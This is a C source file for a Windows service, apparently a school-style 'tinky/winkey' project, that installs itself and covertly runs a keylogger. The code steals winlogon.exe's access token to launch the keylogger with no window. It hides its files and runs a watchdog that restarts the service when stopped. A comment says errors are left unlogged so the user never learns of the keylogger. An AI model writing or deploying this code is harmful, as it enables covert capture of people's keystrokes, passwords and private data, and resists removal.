#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <tchar.h>

#define SERVICE_NAME "svc"
#define WATCHDOG_MODE_FLAG "--watchdog"
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2 0x0A00
#define _WIN32_WINNT_WIN10_RS1 0x0A00
#define _WIN32_WINNT_WIN10_RS2 0x0A00
#define _WIN32_WINNT_WIN10_RS3 0x0A00
#define _WIN32_WINNT_WIN10_RS4 0x0A00
#define _WIN32_WINNT_WIN10_RS5 0x0A00
#define NTDDI_WIN10_CU 0x0A000000
#define NEW_TINKY_EXE "C:\\svc.exe"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE hKeyloggerProcess = NULL;

char TINKY_EXE[MAX_PATH];
char WINKY_EXE[MAX_PATH];

DWORD WINAPI WatchdogThread(LPVOID lpParam);

void SetTinkyPath(void)
{
    if (GetModuleFileName(NULL, TINKY_EXE, MAX_PATH) == 0)
    {
        // printf("Failed to get current executable path. Error: %lu\n", GetLastError());
        return;
    }

    strncpy(WINKY_EXE, TINKY_EXE, MAX_PATH);

    char* tinkyPosition = strstr(WINKY_EXE, "tinky\\svc.exe");
    if (tinkyPosition)
    {
        strncpy(tinkyPosition, "winkey\\winkey.exe", MAX_PATH - (tinkyPosition - WINKY_EXE));
    }
}

int InstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        // printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }

    char servicePath[MAX_PATH + 16];
    snprintf(servicePath, MAX_PATH + 16, "%s start", TINKY_EXE);

    SC_HANDLE hService = CreateService(
        hSCManager, SERVICE_NAME, SERVICE_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        servicePath,
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService)
    {
        // printf("CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    // printf("Service installed successfully.\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int UninstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        // printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }
    
    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, DELETE);
    if (!hService)
    {
        // printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    if (DeleteService(hService))
    {
        // printf("Service deleted successfully.\n");
    }
    else
    {
        // printf("DeleteService failed: %lu\n", GetLastError());
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

void StopKeylogger(void)
{
    if (hKeyloggerProcess)
    {
        TerminateProcess(hKeyloggerProcess, 0);
        CloseHandle(hKeyloggerProcess);
        hKeyloggerProcess = NULL;
    }
}

void WINAPI ControlHandler(DWORD request)
{
    switch (request)
    {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            StopKeylogger();
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;
        default:
            break;
    }
    SetServiceStatus(hStatus, &ServiceStatus);
}

DWORD FindProcessID(const char* processName)
{
    DWORD processID = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe))
        {
            do
            {
                if (strcmp(pe.szExeFile, processName) == 0)
                {
                    processID = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    return processID;
}

/*
    if this would fail i cannot log as
    otherwise i'd be giving user information about keylogger
*/    
void StartKeylogger(void)
{
    DWORD pid = FindProcessID("winlogon.exe");
    if (pid == 0)
    {
        // printf("Failed to find winlogon.exe process.\n");
        return;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    if (!processHandle)
    {
        // printf("OpenProcess failed: %lu\n", GetLastError());
        return;
    }

    HANDLE tokenHandle = NULL;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle))
    {
        // printf("OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return;
    }

    HANDLE dupTokenHandle = NULL;
    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))
    {
        // printf("DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        return;
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessAsUser(dupTokenHandle, NULL, WINKY_EXE, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        // printf("CreateProcessAsUser failed: %lu\n", GetLastError());
    }
    else
    {
        hKeyloggerProcess = pi.hProcess;
        CloseHandle(pi.hThread);
    }

    CloseHandle(dupTokenHandle);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);
}

int UpdateAvailable(const char* filePath)
{
    WIN32_FIND_DATA findFileData;
    HANDLE handle = FindFirstFile(filePath, &findFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found) FindClose(handle);
    return found;
}

DWORD WINAPI CheckForUpdates(LPVOID lpParam)
{
    (void)lpParam;
    FILETIME lastCheckedFileTime_TINKY = {0};
    FILETIME lastCheckedFileTime_WINKY = {0};

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        WIN32_FILE_ATTRIBUTE_DATA currentFileData;

        if (GetFileAttributesEx(TINKY_EXE, GetFileExInfoStandard, &currentFileData))
        {
            if (CompareFileTime(&currentFileData.ftLastWriteTime, &lastCheckedFileTime_TINKY) > 0)
            {
                lastCheckedFileTime_TINKY = currentFileData.ftLastWriteTime;

                StopKeylogger();

                StartKeylogger();
            }
        }
        else
        {
            // printf("Failed to get file attributes for %s. Error: %lu\n", TINKY_EXE, GetLastError());
        }

        if (GetFileAttributesEx(WINKY_EXE, GetFileExInfoStandard, &currentFileData))
        {
            if (CompareFileTime(&currentFileData.ftLastWriteTime, &lastCheckedFileTime_WINKY) > 0)
            {
                lastCheckedFileTime_WINKY = currentFileData.ftLastWriteTime;

                StopKeylogger();

                StartKeylogger();
            }
        }
        else
        {
            // printf("Failed to get file attributes for %s. Error: %lu\n", TINKY_EXE, GetLastError());
        }

        Sleep(60000);
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    (void)argc;
    (void)argv;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
    if (!hStatus)
    {
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 3000;
    SetServiceStatus(hStatus, &ServiceStatus);

    Sleep(2000);

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(hStatus, &ServiceStatus);

    StartKeylogger();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchdogThread, NULL, 0, NULL); // Watchdog thread

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(1000);
    }
}

void HideFiles(void)
{
    SetFileAttributes(TINKY_EXE, FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributes(WINKY_EXE, FILE_ATTRIBUTE_HIDDEN);
}

int StartServiceProgrammatically(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager)
    {
        // printf("OpenSCManager failed: %lu\n", GetLastError());
        return 1;
    }

    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_START);
    if (!hService)
    {
        // printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return 1;
    }

    if (!StartService(hService, 0, NULL))
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING)
        {
            // printf("Service is already running.\n");
        }
        else
        {
            // printf("StartService failed: %lu\n", err);
        }
    }
    else
    {
        // printf("Service started successfully.\n");
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

void stopService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP);
    if (hService)
    {
        ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
        CloseServiceHandle(hService);
    }
    CloseServiceHandle(hSCManager);
}

void LaunchWatchdogProcess(void)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    TCHAR commandLine[MAX_PATH * 2];

    // printf("Launching watchdog process...\n");
    // Prepare the command line for watchdog mode
    _stprintf(commandLine, _T("%s %s"), _T(TINKY_EXE), _T(WATCHDOG_MODE_FLAG));

    if (!CreateProcess(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        // printf("Failed to create watchdog process: %lu\n", GetLastError());
    }
    else
    {
        // printf("Watchdog process created successfully.\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

DWORD WINAPI WatchdogThread(LPVOID lpParam)
{
    while (1)
    {
        Sleep(300000);

        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
        if (hSCManager)
        {
            SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_QUERY_STATUS);
            if (hService)
            {
                SERVICE_STATUS_PROCESS serviceStatus;
                DWORD bytesNeeded;
                if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatus,
                                         sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
                {
                    if (serviceStatus.dwCurrentState != SERVICE_RUNNING)
                    {
                        StartServiceProgrammatically();
                        SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
                        StartServiceCtrlDispatcher(ServiceTable);
                    }
                }
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
    return 0;
}

int main(int argc, char* argv[])
{
    SetTinkyPath();

    if (argc > 1 && strcmp(argv[1], WATCHDOG_MODE_FLAG) == 0)
    {
        WatchdogThread(NULL);
        return 0;
    }

    if (argc > 1)
    {
        if (strcmp(argv[1], "install") == 0)
        {
            HideFiles();
            InstallService();
            LaunchWatchdogProcess();
            return 0;
        }
        else if (strcmp(argv[1], "delete") == 0)
        {
            stopService();
            return UninstallService();
        }
        else if (strcmp(argv[1], "start") == 0)
        {
            StartServiceProgrammatically();
            SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
            StartServiceCtrlDispatcher(ServiceTable);
        }
        else if (strcmp(argv[1], "stop") == 0)
        {
            stopService();
        }
    }
    else
    {
        SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
        if (!StartServiceCtrlDispatcher(ServiceTable))
        {
            // printf("StartServiceCtrlDispatcher failed: %lu\n", GetLastError());
        }
    }
    return 0;
}
